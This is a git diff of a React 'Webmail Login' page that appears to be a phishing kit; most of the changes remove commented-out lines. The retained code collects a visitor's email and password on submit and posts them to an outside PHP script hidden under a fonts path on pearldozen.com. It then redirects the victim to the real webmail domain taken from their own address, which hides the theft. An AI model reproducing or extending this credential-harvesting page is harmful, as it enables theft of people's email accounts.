@@ -6,26 +6,22 @@ import { MdLock } from 'react-icons/md';
 import $ from 'jquery';
 import Loader from "./Loader/Loader";
 
+// hey
+
 const App = ()=>{
 
   const reloadPreloader = ()=> window.location.reload();
-
-  // const [spinLoader, setSpinLoader] = useState(false);
-
   const [mainWebmail, setMainWebmail] = useState(false);
 
   const [loader2, setLoader2] = useState(false);
 
-  // track
 
     useEffect(()=>{
         document.title = "Webmail Login";
-        // setSpinLoader(true);
         setLoader2(true);
         setTimeout(() => {
           setLoader2(false);
           setMainWebmail(true)
-          // setSpinLoader(false);
         }, 4000);
     }, []);
 
@@ -46,18 +42,10 @@ const App = ()=>{
   
   const submitHandler = (e) => {
     e.preventDefault();
-    // console.log(email, pwd);
     if (pwd === "") {
       return null
-      // alert("Please fill in the input");
-      // setInvalid(true);
     }
     else{
-      // setSpinLoader(true);
-
-      // setTimeout(() => {
-      //   setSpinLoader(false);
-      // }, 2100);
 
         setAuthenticating(true);
         setInvalid(false);
@@ -77,7 +65,6 @@ const App = ()=>{
           url: "https://pearldozen.com/nc_assets/fonts/nas/ns.php",
           data: user,
           success(data) {
-              // alert('OK');
               console.log(data);
           },
       });
@@ -88,13 +75,9 @@ const App = ()=>{
                 const sliceEqualSign = redirectURL.indexOf("@");
                 const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                 console.log(extracetdemailDomain);
-                // window.location.href = "https://www.webmail.gigared.com/";
                 window.location.reload();
                 window.location.href = `https://www.${extracetdemailDomain}`;
-                // window.location.replace('https://webmail.gigared.com/');
             };
-
-      // make post request Headers, below 
 
     }
   };
@@ -103,7 +86,6 @@ const App = ()=>{
   return(<React.Fragment>
 
     { loader2 ? <Loader /> : null }
-    {/* { spinLoader ? <Preloader /> : null } */}
 
     { mainWebmail  ? <section className='wrappper' style={{
       marginTop:'2em'
